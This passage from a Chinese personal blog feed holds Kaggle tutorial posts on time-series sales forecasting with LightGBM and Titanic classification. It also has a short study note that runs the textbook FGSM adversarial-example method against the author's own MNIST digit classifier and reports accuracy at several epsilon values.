class="line"></span><br><span class="line">df_test = pd.read_csv(</span><br><span class="line">    <span class="string">&#x27;/kaggle/input/store-sales-time-series-forecasting/test.csv&#x27;</span>,</span><br><span class="line">    dtype=&#123;</span><br><span class="line">        <span class="string">&#x27;store_nbr&#x27;</span>: <span class="string">&#x27;category&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;family&#x27;</span>: <span class="string">&#x27;category&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;onpromotion&#x27;</span>: <span class="string">&#x27;uint32&#x27;</span>,</span><br><span class="line">    &#125;,</span><br><span class="line">    parse_dates=[<span class="string">&#x27;date&#x27;</span>],</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">df_test[<span class="string">&#x27;date&#x27;</span>] = df_test.date.dt.to_period(<span class="string">&#x27;D&#x27;</span>)</span><br><span class="line">df_test = df_test.set_index([<span class="string">&#x27;store_nbr&#x27;</span>, <span class="string">&#x27;family&#x27;</span>, <span class="string">&#x27;date&#x27;</span>]).sort_index()</span><br><span class="line">X_test_1 = dp.out_of_sample(steps=<span class="number">16</span>)</span><br><span class="line">X_test_1.index.name = <span class="string">&#x27;date&#x27;</span></span><br><span class="line">X_test_1[<span class="string">&#x27;NewYear&#x27;</span>] = (X_test_1.index.dayofyear == <span class="number">1</span>)</span><br><span class="line">sub = model_hybrid.predict(X_test_1).clip(<span class="number">0.0</span>)</span><br><span class="line">sub = sub.join(df_test.<span class="built_in">id</span>).reindex(columns=[<span class="string">&#x27;id&#x27;</span>, <span class="string">&#x27;sales&#x27;</span>])</span><br><span class="line">sub.to_csv(<span class="string">&#x27;submission.csv&#x27;</span>, index=<span class="literal">False</span>)</span><br></pre></td></tr></table></figure></p>]]></content>
      
      
      <categories>
          
          <category> Kaggle-warmup </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>对抗样本攻击简单学习</title>
      <link href="/2024/04/08/%E5%AF%B9%E6%8A%97%E6%A0%B7%E6%9C%AC%E6%94%BB%E5%87%BB%E7%AE%80%E5%8D%95%E5%AD%A6%E4%B9%A0/"/>
      <url>/2024/04/08/%E5%AF%B9%E6%8A%97%E6%A0%B7%E6%9C%AC%E6%94%BB%E5%87%BB%E7%AE%80%E5%8D%95%E5%AD%A6%E4%B9%A0/</url>
      
        <content type="html"><![CDATA[<p>很久以前就听说过对抗样本攻击,最近看Diffusion Model的时候也注意到了GAN相关,所以这里对对抗样本攻击做一个简单记录.</p><p>先简短写一份FGSM,写完之后才发现有一个叫<a href="https://aisafety.readthedocs.io/zh-cn/latest/Start/index.html">AISafety</a>的平台,后续准备再在这个平台上面研究一下.</p><h2 id="fgsm">FGSM</h2><p>首先torch官方也给出了对抗样本相关poc,可以直接进行参考. <a href="https://pytorch.org/tutorials/beginner/fgsm_tutorial.html">FGSM</a>.</p><p>关于FGSM,首先肯定是最有名的熊猫图了 <img src="panda.png" alt="panda" /></p><p>从torch官网给出的例子来看,FGSM是在知道模型参数情况下的白盒攻击. 思路主要是通过求lossfunction对x的梯度,对x往最大化loss的方向进行移动,同时做出对epsilon的上限限制以及range的clip.</p><p>说清楚了之后其实就是上面这一句话, 然后这里贴一个github上面找到的另一个fgsm_attack的主要函数方便分析. <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># https://github.com/Harry24k/FGSM-pytorch/blob/master/FGSM.ipynb</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">fgsm_attack</span>(<span class="params">model, loss, images, labels, eps</span>) :</span><br><span class="line">    </span><br><span class="line">    images = images.to(device)</span><br><span class="line">    labels = labels.to(device)</span><br><span class="line">    images.requires_grad = <span class="literal">True</span></span><br><span class="line">            </span><br><span class="line">    outputs = model(images)</span><br><span class="line">    </span><br><span class="line">    model.zero_grad()</span><br><span class="line">    cost = loss(outputs, labels).to(device)</span><br><span class="line">    cost.backward()</span><br><span class="line">    attack_images = images + eps * images.grad.sign()</span><br><span class="line">    attack_images = torch.clamp(attack_images, <span class="number">0</span>, <span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> attack_images</span><br><span class="line"></span><br></pre></td></tr></table></figure></p><p>后续自己跑回kaggle复用了一下digit-recognizer,并且对添加噪音之后的图进行了输出查看.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">show_images</span>(<span class="params">datset, num_samples=<span class="number">20</span>, cols=<span class="number">5</span>, label=<span class="literal">None</span></span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot; Plots some samples from the dataset &quot;&quot;&quot;</span></span><br><span class="line">    plt.figure(figsize=(<span class="number">15</span>,<span class="number">15</span>)) </span><br><span class="line">    <span class="keyword">for</span> i, img <span class="keyword">in</span> <span class="built_in">enumerate</span>(datset):</span><br><span class="line">        <span class="keyword">if</span> i == num_samples:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        ax = plt.subplot(<span class="built_in">int</span>(num_samples/cols) + <span class="number">1</span>, cols, i + <span class="number">1</span>)</span><br><span class="line">        ax.set_title(label[i])</span><br><span class="line">        plt.imshow(img[<span class="number">0</span>])</span><br><span class="line">        </span><br><span class="line">epsilons = [<span class="number">0</span>, <span class="number">.05</span>, <span class="number">.1</span>, <span class="number">.15</span>, <span class="number">.2</span>, <span class="number">.25</span>, <span class="number">.3</span>]</span><br><span class="line">x_train, x_test, y_train, y_test = train_test_split(train_x, train_y, test_size=<span class="number">0.2</span>)</span><br><span class="line">dataset = TensorDataset(x_train, y_train)</span><br><span class="line">train_iter = DataLoader(dataset, batch_size=batch_size, shuffle=<span class="literal">True</span>)</span><br><span class="line"><span class="comment"># Run test for each epsilon</span></span><br><span class="line"><span class="keyword">for</span> eps <span class="keyword">in</span> epsilons:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;Epsilon: <span class="subst">&#123;eps&#125;</span>&quot;</span>)</span><br><span class="line">    correct_before = <span class="number">0</span></span><br><span class="line">    correct_after = <span class="number">0</span></span><br><span class="line">    total = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> x, y <span class="keyword">in</span> train_iter:</span><br><span class="line">        x = torch.clamp(x, <span class="number">0</span>, <span class="number">1</span>)</span><br><span class="line">        fgsm_x = fgsm_attack(model, loss, x, y.long(), eps)</span><br><span class="line">        y_pred = model(x).argmax(axis=<span class="number">1</span>)</span><br><span class="line">        total += <span class="built_in">len</span>(y)</span><br><span class="line">        correct_before += <span class="built_in">sum</span>(y_pred == y)</span><br><span class="line">        y_pred_after = model(fgsm_x).argmax(axis=<span class="number">1</span>)</span><br><span class="line">        correct_after += <span class="built_in">sum</span>(y_pred_after == y)</span><br><span class="line">        last_x = x</span><br><span class="line">        </span><br><span class="line">        last_y_before = y_pred</span><br><span class="line">        last_y_after = y_pred_after</span><br><span class="line">        </span><br><span class="line">    show_images(last_x[:<span class="number">5</span>].detach().cpu(), num_samples=<span class="number">5</span>, cols=<span class="number">5</span>, label=last_y_before[:<span class="number">5</span>])</span><br><span class="line">    show_images(fgsm_x[:<span class="number">5</span>].detach().cpu(), num_samples=<span class="number">5</span>, cols=<span class="number">5</span>, label=last_y_after[:<span class="number">5</span>])</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&#x27;before attack: <span class="subst">&#123;correct_before/total&#125;</span>&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&#x27;after attack: <span class="subst">&#123;correct_after/total&#125;</span>&#x27;</span>)</span><br><span class="line"><span class="comment"># Epsilon: 0</span></span><br><span class="line"><span class="comment"># before attack: 0.9817559123039246</span></span><br><span class="line"><span class="comment"># after attack: 0.9817559123039246</span></span><br><span class="line"><span class="comment"># Epsilon: 0.05</span></span><br><span class="line"><span class="comment"># before attack: 0.9817559123039246</span></span><br><span class="line"><span class="comment"># after attack: 0.9459821581840515</span></span><br><span class="line"><span class="comment"># Epsilon: 0.1</span></span><br><span class="line"><span class="comment"># before attack: 0.9817559123039246</span></span><br><span class="line"><span class="comment"># after attack: 0.8537499904632568</span></span><br><span class="line"><span class="comment"># Epsilon: 0.15</span></span><br><span class="line"><span class="comment"># before attack: 0.9817559123039246</span></span><br><span class="line"><span class="comment"># after attack: 0.6502678394317627</span></span><br><span class="line"><span class="comment"># Epsilon: 0.2</span></span><br><span class="line"><span class="comment"># before attack: 0.9817559123039246</span></span><br><span class="line"><span class="comment"># after attack: 0.3650892674922943</span></span><br><span class="line"><span class="comment"># Epsilon: 0.25</span></span><br><span class="line"><span class="comment"># before attack: 0.9817559123039246</span></span><br><span class="line"><span class="comment"># after attack: 0.14562499523162842</span></span><br><span class="line"><span class="comment"># Epsilon: 0.3</span></span><br><span class="line"><span class="comment"># before attack: 0.9817559123039246</span></span><br><span class="line"><span class="comment"># after attack: 0.04541666433215141</span></span><br></pre></td></tr></table></figure><p>这里一开始我自己并没有做clip,导致FGSM即使epsilon设置0也会导致性能巨幅下降,后续在train里面带上了clip并且对模拟攻击部分也带上了相应处理,顺利解决. 这里epsilon为0时两者性能接近,而随着epsilon的增大模型性能开始下降,通过后面图片的输出发现其实主要部分还是不变的, 不过颜色的处理应该还是有一些问题, 其实仔细一看差别还是蛮大的. <img src="epsilon_img.png" alt="epsilon" /></p><p>并且目前CV方向的模型还处理的不是很熟练,灰度处理之后应该会好一些或者至少能看出更多问题. 暂时先写一个FGSM,后续有空还会继续看其他攻击方法.</p>]]></content>
      
      
      <categories>
          
          <category> 杂谈 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Kaggle_warmup3-TimeSeries</title>
      <link href="/2024/04/06/Kaggle-warmup3-TimeSeries/"/>
      <url>/2024/04/06/Kaggle-warmup3-TimeSeries/</url>
      
        <content type="html"><![CDATA[<p>今天看学习资料的时候发现kaggle还有时序相关的ML问题,想起之前看到有公司也有要求时序处理相关经验,这里就从零开始学习一下时序处理相关,可能一篇不太写得完,毕竟是以前没做过的东西,大概会多写一些.</p><p>题目是<a href="https://www.kaggle.com/competitions/store-sales-time-series-forecasting">Store Sales - Time Series Forecasting</a></p><p>然后学习的notebook是来自<a href="https://www.kaggle.com/code/amisha0528/store-sales-time-series-data-prediction/notebook">Amisha0528</a>这位朋友的,</p><h2 id="数据读取和合并">数据读取和合并</h2><p>首先dataset提供的内容包含在多个文件中</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">train =pd.read_csv(<span class="string">&quot;/kaggle/input/store-sales-time-series-forecasting/train.csv&quot;</span>)</span><br><span class="line">test=pd.read_csv(<span class="string">&quot;/kaggle/input/store-sales-time-series-forecasting/test.csv&quot;</span>)</span><br><span class="line">oil=pd.read_csv(<span class="string">&quot;/kaggle/input/store-sales-time-series-forecasting/oil.csv&quot;</span>)</span><br><span class="line">stores=pd.read_csv(<span class="string">&quot;/kaggle/input/store-sales-time-series-forecasting/stores.csv&quot;</span>)</span><br><span class="line">transactions=pd.read_csv(<span class="string">&quot;/kaggle/input/store-sales-time-series-forecasting/transactions.csv&quot;</span>)</span><br><span class="line">holidays=pd.read_csv(<span class="string">&quot;/kaggle/input/store-sales-time-series-forecasting/holidays_events.csv&quot;</span>)</span><br></pre></td></tr></table></figure><p>数据设计多表合并,以前并没有碰到过此类问题在这里记录一下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">train[<span class="string">&#x27;test&#x27;</span>] = <span class="number">0</span></span><br><span class="line">test[<span class="string">&#x27;test&#x27;</span>] = <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># concat 连接train和test, 依靠test字段做区分</span></span><br><span class="line">data = pd.concat([train, test], axis=<span class="number">0</span>)</span><br><span class="line"><span class="comment"># merge做表合并</span></span><br><span class="line">data = data.merge(holidays, on=<span class="string">&#x27;date&#x27;</span>, how=<span class="string">&#x27;left&#x27;</span>)</span><br><span class="line">data= data.merge(stores, on=<span class="string">&#x27;store_nbr&#x27;</span>, how=<span class="string">&#x27;left&#x27;</span>)</span><br><span class="line">data= data.merge(oil, on=<span class="string">&#x27;date&#x27;</span>, how=<span class="string">&#x27;left&#x27;</span>)</span><br><span class="line">data= data.merge(transactions, on=[<span class="string">&#x27;date&#x27;</span>, <span class="string">&#x27;store_nbr&#x27;</span>], how=<span class="string">&#x27;left&#x27;</span>)</span><br><span class="line"><span class="comment"># set_index指定选取哪些作为index</span></span><br><span class="line">data = data.set_index([<span class="string">&#x27;store_nbr&#x27;</span>, <span class="string">&#x27;date&#x27;</span>, <span class="string">&#x27;family&#x27;</span>])</span><br><span class="line">data = data.drop(index=<span class="string">&#x27;2013-01-01&#x27;</span>, level=<span class="number">1</span>)</span><br><span class="line">data</span><br></pre></td></tr></table></figure><p>首先新增test字段做train和test的区分,然后对train和test进行合并方便做表合并,最后选取多列做index <img src="data1_head.png" alt="head" /></p><p>后续使用pandas的datetime进行处理,这里可以直接单独提取year, month, day, week等字段作为单独列方便后续处理 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># date处理</span></span><br><span class="line">data_ = data.copy().reset_index()</span><br><span class="line"></span><br><span class="line">data_[<span class="string">&#x27;date&#x27;</span>] = pd.to_datetime(data_[<span class="string">&quot;date&quot;</span>])</span><br><span class="line">data_[<span class="string">&#x27;day_of_week&#x27;</span>] = data_[<span class="string">&#x27;date&#x27;</span>].dt.day_of_week</span><br><span class="line">data_[<span class="string">&#x27;day_of_year&#x27;</span>] = data_[<span class="string">&#x27;date&#x27;</span>].dt.dayofyear</span><br><span class="line">data_[<span class="string">&#x27;day_of_month&#x27;</span>] = data_[<span class="string">&#x27;date&#x27;</span>].dt.day</span><br><span class="line">data_[<span class="string">&#x27;month&#x27;</span>] = data_[<span class="string">&#x27;date&#x27;</span>].dt.month</span><br><span class="line">data_[<span class="string">&#x27;quarter&#x27;</span>] = data_[<span class="string">&#x27;date&#x27;</span>].dt.quarter</span><br><span class="line">data_[<span class="string">&#x27;year&#x27;</span>] = data_[<span class="string">&#x27;date&#x27;</span>].dt.year</span><br><span class="line"></span><br><span class="line">train = data_[data_[<span class="string">&#x27;test&#x27;</span>] == <span class="number">0</span>]</span><br><span class="line">test = data_[data_[<span class="string">&#x27;test&#x27;</span>] == <span class="number">1</span>]</span><br><span class="line"></span><br><span class="line">train.head()</span><br></pre></td></tr></table></figure></p><p>这里可以groupby看一下各种时间的sales数据,可以做一些ploting之类的工作</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># groupby对sale求和</span></span><br><span class="line"><span class="comment"># groupby学习</span></span><br><span class="line">grouping_columns = [<span class="string">&#x27;year&#x27;</span>, <span class="string">&#x27;quarter&#x27;</span>, <span class="string">&#x27;month&#x27;</span>, <span class="string">&#x27;day_of_week&#x27;</span>, <span class="string">&#x27;day_of_year&#x27;</span>, <span class="string">&#x27;day_of_month&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> ind, column <span class="keyword">in</span> <span class="built_in">enumerate</span>(grouping_columns):</span><br><span class="line">    grouped_data = train.groupby(column)[<span class="string">&#x27;sales&#x27;</span>].<span class="built_in">sum</span>()</span><br><span class="line">    grouped_data = pd.DataFrame(grouped_data).reset_index()</span><br></pre></td></tr></table></figure><h2 id="创建lag和window">创建lag和window</h2><p>这里我个人感觉是关键部分,通过前面提取的date信息,这里我们通过建立date之间的关系并提取作为新的列,这些列会在后续作为feature使用</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># shifting data</span></span><br><span class="line">alphas = [<span class="number">0.95</span>, <span class="number">0.8</span>, <span class="number">0.65</span>, <span class="number">0.5</span>]</span><br><span class="line">lags =[<span class="number">1</span>,<span class="number">7</span>,<span class="number">30</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># lag表delay,alpha表同时被考虑的窗口</span></span><br><span class="line"><span class="keyword">for</span> a <span class="keyword">in</span> alphas:</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> lags:</span><br><span class="line">        data_[<span class="string">f&#x27;sales_lag_<span class="subst">&#123;i&#125;</span>_alpha_<span class="subst">&#123;a&#125;</span>&#x27;</span>] = np.log1p(grouped_data[<span class="string">&#x27;sales&#x27;</span>].transform(<span class="keyword">lambda</span> x: x.shift(i).ewm(alpha=a, min_periods=<span class="number">1</span>).mean()))</span><br><span class="line"></span><br><span class="line">data_[<span class="string">&#x27;sales_lag_7_alpha_0.5&#x27;</span>].describe()</span><br></pre></td></tr></table></figure><p>shift是创建lag,ewm是选择窗口,表示每个数值由相近的多少个值所决定.</p><h2 id="最后数据提取和列的取舍">最后数据提取和列的取舍</h2><p>后续即做train_test_split并且丢弃一些列,这里作者还涉及了一些dummy相关但最后似乎并没有做相应处理 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">data_[<span class="string">&#x27;onpromotion&#x27;</span>] = data_[<span class="string">&#x27;onpromotion&#x27;</span>].apply(<span class="keyword">lambda</span> x: x &gt; <span class="number">0</span>)</span><br><span class="line">sales_lag_columns = <span class="built_in">list</span>(data_.<span class="built_in">filter</span>(like=<span class="string">&quot;lag&quot;</span>).columns)</span><br><span class="line"></span><br><span class="line">training_percentage = <span class="number">0.8</span></span><br><span class="line">testing_percentage = <span class="number">0.2</span></span><br><span class="line"></span><br><span class="line">to_dummies = [<span class="string">&#x27;day_of_week&#x27;</span>, <span class="string">&#x27;day_of_month&#x27;</span>, <span class="string">&#x27;month&#x27;</span>, <span class="string">&#x27;quarter&#x27;</span>, <span class="string">&#x27;year&#x27;</span>, <span class="string">&#x27;store_nbr&#x27;</span>, <span class="string">&#x27;type_y&#x27;</span>, <span class="string">&#x27;cluster&#x27;</span>, <span class="string">&#x27;family&#x27;</span>, <span class="string">&#x27;onpromotion&#x27;</span>, <span class="string">&#x27;type_x&#x27;</span>,</span><br><span class="line">       <span class="string">&#x27;locale&#x27;</span>, <span class="string">&#x27;locale_name&#x27;</span>, <span class="string">&#x27;city&#x27;</span>, <span class="string">&#x27;state&#x27;</span>]</span><br><span class="line"></span><br><span class="line">X = data_.loc[:, [ <span class="string">&#x27;day_of_week&#x27;</span>, <span class="string">&#x27;day_of_month&#x27;</span>, <span class="string">&#x27;month&#x27;</span>, <span class="string">&#x27;quarter&#x27;</span>, <span class="string">&#x27;year&#x27;</span>, <span class="string">&#x27;store_nbr&#x27;</span>, <span class="string">&#x27;type_y&#x27;</span>, <span class="string">&#x27;cluster&#x27;</span>, <span class="string">&#x27;family&#x27;</span>, <span class="string">&#x27;onpromotion&#x27;</span>, <span class="string">&#x27;type_x&#x27;</span>,</span><br><span class="line">       <span class="string">&#x27;locale&#x27;</span>, <span class="string">&#x27;locale_name&#x27;</span>,  <span class="string">&#x27;city&#x27;</span>, <span class="string">&#x27;state&#x27;</span>, <span class="string">&#x27;test&#x27;</span>, <span class="string">&#x27;sales&#x27;</span>, <span class="string">&#x27;id&#x27;</span>]+ sales_lag_columns]</span><br><span class="line">X[to_dummies] = X[to_dummies].astype(<span class="string">&#x27;category&#x27;</span>)</span><br><span class="line"></span><br><span class="line">data_train = X[X[<span class="string">&#x27;test&#x27;</span>] == <span class="number">0</span>]</span><br><span class="line">data_test = X[X[<span class="string">&#x27;test&#x27;</span>] == <span class="number">1</span>]</span><br><span class="line"></span><br><span class="line">n = <span class="built_in">len</span>(data_train)</span><br><span class="line"></span><br><span class="line">training_start = <span class="number">0</span></span><br><span class="line">training_end = math.floor(n * training_percentage)</span><br><span class="line">validation_start = training_end</span><br><span class="line">validation_end = n</span><br><span class="line"></span><br><span class="line">X_train = data_train.loc[training_start:training_end, :].drop([<span class="string">&#x27;test&#x27;</span>, <span class="string">&#x27;sales&#x27;</span>, <span class="string">&#x27;id&#x27;</span>],  axis=<span class="number">1</span>)</span><br><span class="line">y_train = data_train.loc[training_start:training_end, <span class="string">&#x27;sales&#x27;</span>]</span><br><span class="line">X_val = data_train.loc[validation_start:validation_end,  :].drop([<span class="string">&#x27;test&#x27;</span>, <span class="string">&#x27;sales&#x27;</span>, <span class="string">&#x27;id&#x27;</span>],  axis=<span class="number">1</span>)</span><br><span class="line">y_val = data_train.loc[validation_start:validation_end, <span class="string">&#x27;sales&#x27;</span>]</span><br><span class="line"></span><br><span class="line">X_test = data_test.loc[:, ].drop([<span class="string">&#x27;test&#x27;</span>, <span class="string">&#x27;sales&#x27;</span>, <span class="string">&#x27;id&#x27;</span>],  axis=<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># filter chars</span></span><br><span class="line">X_train = X_train.rename(columns = <span class="keyword">lambda</span> x:re.sub(<span class="string">&#x27;[^A-Za-z0-9_]+&#x27;</span>, <span class="string">&#x27;&#x27;</span>, x)) </span><br><span class="line">X_val = X_val.rename(columns = <span class="keyword">lambda</span> x:re.sub(<span class="string">&#x27;[^A-Za-z0-9_]+&#x27;</span>, <span class="string">&#x27;&#x27;</span>, x)) </span><br><span class="line">X_test = X_test.rename(columns = <span class="keyword">lambda</span> x:re.sub(<span class="string">&#x27;[^A-Za-z0-9_]+&#x27;</span>, <span class="string">&#x27;&#x27;</span>, x)) </span><br><span class="line">X_train.head()</span><br></pre></td></tr></table></figure></p><h2 id="train">train</h2><p>最后丢进LGBMRegressor, LightGBM, short for light gradient-boosting machine.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">hyper_params = &#123;<span class="string">&#x27;task&#x27;</span>: <span class="string">&#x27;train&#x27;</span>,<span class="string">&#x27;boosting_type&#x27;</span>: <span class="string">&#x27;gbdt&#x27;</span>,<span class="string">&#x27;objective&#x27;</span>: <span class="string">&#x27;regression&#x27;</span>,<span class="string">&#x27;metric&#x27;</span>: [<span class="string">&#x27;l1&#x27;</span>,<span class="string">&#x27;l2&#x27;</span>],<span class="string">&#x27;learning_rate&#x27;</span>: <span class="number">0.1</span>,</span><br><span class="line"><span class="string">&#x27;feature_fraction&#x27;</span>: <span class="number">0.9</span>,<span class="string">&#x27;bagging_fraction&#x27;</span>: <span class="number">0.7</span>,<span class="string">&#x27;bagging_freq&#x27;</span>: <span class="number">10</span>,<span class="string">&#x27;verbose&#x27;</span>: <span class="number">0</span>,<span class="string">&quot;max_depth&quot;</span>: <span class="number">50</span>,<span class="string">&quot;num_leaves&quot;</span>: <span class="number">128</span>,<span class="string">&quot;max_bin&quot;</span>: <span class="number">512</span>&#125;</span><br><span class="line"></span><br><span class="line">gbm = lgb.LGBMRegressor(**hyper_params)</span><br><span class="line"></span><br><span class="line">gbm.fit(X_train, y_train,</span><br><span class="line">        eval_set=[(X_val, y_val)],</span><br><span class="line">        eval_metric=<span class="string">&#x27;l1&#x27;</span>)</span><br><span class="line"></span><br><span class="line">y_pred = gbm.predict(X_val)</span><br><span class="line">results = pd.concat([y_val.reset_index(drop=<span class="literal">True</span>), pd.Series(y_pred)], axis=<span class="number">1</span>).rename(columns=&#123;<span class="string">&#x27;sales&#x27;</span>: <span class="string">&#x27;y_val&#x27;</span>, <span class="number">0</span>: <span class="string">&#x27;y_pred&#x27;</span>&#125;)</span><br><span class="line">results[<span class="string">&#x27;y_pred&#x27;</span>] = results[<span class="string">&#x27;y_pred&#x27;</span>].clip(<span class="number">0</span>)</span><br><span class="line">results = results[results[<span class="string">&#x27;y_val&#x27;</span>] &gt; <span class="number">10</span>]</span><br><span class="line">results</span><br></pre></td></tr></table></figure><h2 id="todo">TODO</h2><p>这次写的主要是数据处理流程以及最后模型的使用,这次先记录所看的第一个notebook,对于这一类以前没遇到的问题还是得多看多练,后续也会再多找几个notebook进行学习和记录.</p>]]></content>
      
      
      <categories>
          
          <category> Kaggle-warmup </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Kaggle_warmup2-BiClassification</title>
      <link href="/2024/04/06/Kaggle-warmup2-BiClassification/"/>
      <url>/2024/04/06/Kaggle-warmup2-BiClassification/</url>
      
        <content type="html"><![CDATA[<p>Kaggle上面的<a href="https://www.kaggle.com/competitions/titanic">Titanic - Machine Learning from Disaster</a></p><h2 id="简要分析">简要分析</h2><p>首先看数据 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">train_path = <span class="string">&#x27;/kaggle/input/titanic/train.csv&#x27;</span></span><br><span class="line">train_data = pd.read_csv(train_path)</span><br><span class="line">train_data.head()</span><br></pre></td></tr></table></figure> <img src="df_head.png" alt="train_head" /></p><p>主要是从一些feature进行预测,target feature为<code>Survived</code>,仅0,1,标准二分类. 官方文档也提供了feature engineering的思路. 可以后续做优化不过这里仅做baseline和必要处理,比如fillna,one-hot-encoding之类的.</p><p>通过info看下数据na情况. <img src="info.png" alt="data_info" /></p><p>可以看到age需要进行fillna, Cabin因为na过多可以丢弃, 其余numerical可以做MinMaxScale.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> sklearn.preprocessing <span class="keyword">import</span> MinMaxScaler</span><br><span class="line"></span><br><span class="line">train_data = pd.read_csv(train_path)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">preprocessing</span>(<span class="params">df</span>):</span><br><span class="line">    <span class="comment"># drop columns and fill 